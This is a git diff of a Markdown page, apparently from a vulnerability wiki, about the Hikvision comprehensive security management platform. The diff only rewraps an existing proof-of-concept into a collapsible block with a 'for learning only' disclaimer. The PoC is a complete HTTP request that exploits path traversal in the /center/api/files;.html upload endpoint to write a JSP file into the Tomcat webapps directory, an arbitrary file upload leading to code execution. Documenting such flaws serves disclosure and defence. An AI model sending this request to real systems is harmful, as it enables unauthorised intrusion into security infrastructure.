@@ -39,8 +39,10 @@ web.title=="综合安防管理平台"
 
 ![image-20230828163622054](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828163622054.png)
 
-```
-POST /center/api/files;.html HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /center/api/files;.html HTTP/1.1
 Host: 
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
 
@@ -48,10 +50,11 @@ Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa5
 Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/Hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
 Content-Type: application/zip
 
-<%out.print("test3");%>
+&lt;%out.print("test3");%&gt;
 
-------WebKitFormBoundary9PggsiM755PLa54a--
-```
+------WebKitFormBoundary9PggsiM755PLa54a--</code></pre>
+
+</details>
 
 ![image-20230828163639195](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828163639195.png)
 
